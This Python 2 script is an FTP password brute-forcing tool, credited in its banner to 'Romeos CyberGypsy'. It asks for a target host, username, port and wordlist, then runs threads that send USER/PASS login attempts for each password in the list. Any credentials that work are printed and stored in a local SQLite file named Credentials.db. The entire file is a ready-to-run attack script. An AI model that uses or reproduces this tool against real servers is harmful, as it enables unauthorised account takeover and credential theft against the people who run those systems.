
import sqlite3 as lite
import time
import threading
import socket
from colorama import *
import sys
import codecs
#import tqdm

def connect(host, username, password, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, int(port)))
        s.recv(1024)
    except Exception as e:
        print e
        sys.exit()

    user_data = 'USER {}\r\n'.format(username)
    s.send(user_data)
    s.recv(1024)
    pass_data = 'PASS {}\r\n'.format(password)
    s.send(pass_data)
    data = s.recv(1024)
    if "Login successful" in data:
        print Fore.YELLOW+Back.RED+"_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-"
        print Fore.GREEN+"Success username:{}{} {}password:{}{}".format(Fore.YELLOW,username, Fore.GREEN, Fore.YELLOW, password)
        print Fore.YELLOW+Back.RED+"_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-"+Fore.RESET+Back.RESET
        con = lite.connect("Credentials.db")
        cur = con.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS Creds(Host TEXT, Username TEXT, Password TEXT)")
        creds = [host, username, password]
        cur.execute("INSERT INTO Creds VALUES(?,?,?)", creds)
        con.commit()
        con.close()
        #messagebox.showinfo("Success:","Username:{}\nPassword:{}".format(username, password))

        sys.exit()

    else:
        pass

    s.close()

def brute(host, username, wordlist, port, threads):
    print Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+Fore.GREEN+"Reading wordlist..."
    f = codecs.open(wordlist, 'r')
    print Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Attack beginning...".format(Fore.GREEN)
    print "\n"
    thread = 0
    for password in f.readlines():
        password = password.strip("\n")
        print Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Trying password{} {}".format(Fore.GREEN, Fore.YELLOW, password)
        thread1 = threading.Thread(target = connect, args = (host, username, password, port,))
        thread1.start()
        thread+=1
        if thread%threads == 0:
            print "\n{}Sleeping for 2 seconds before continue...\n".format(Fore.YELLOW)
            time.sleep(2)
        #connect(host, username, password, port)


banner = '''
+-+-+-+ +-+-+-+-+-+
|f|t|p| |b|r|u|t|e|
+-+-+-+ +-+-+-+-+-+'''
print Fore.BLUE+banner
print Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Written By Romeos CyberGypsy".format(Fore.GREEN)
host = raw_input(Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Enter host IP Address or domain name:{}".format(Fore.GREEN, Fore.YELLOW))
user = raw_input(Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Enter username to bruteforce:{}".format(Fore.GREEN, Fore.YELLOW))
try:
    port = int(raw_input(Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Enter target port(Defaults to 21):{}".format(Fore.GREEN, Fore.YELLOW)))

except:
    port = 21

wordlist = raw_input(Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Enter path to wordlist:{}".format(Fore.GREEN, Fore.YELLOW))
threads = int(raw_input(Fore.YELLOW+"["+Fore.RED+"*"+Fore.YELLOW+"]"+"{}Enter number of threads to run concurrently:{}".format(Fore.GREEN, Fore.YELLOW)))

try:
	brute(socket.gethostbyname(host), user, wordlist, port, threads)
except KeyboardInterrupt:
	print Fore.RED+"Exiting safely..."
	sys.exit()
except Exception as e:
	print Fore.RED+e
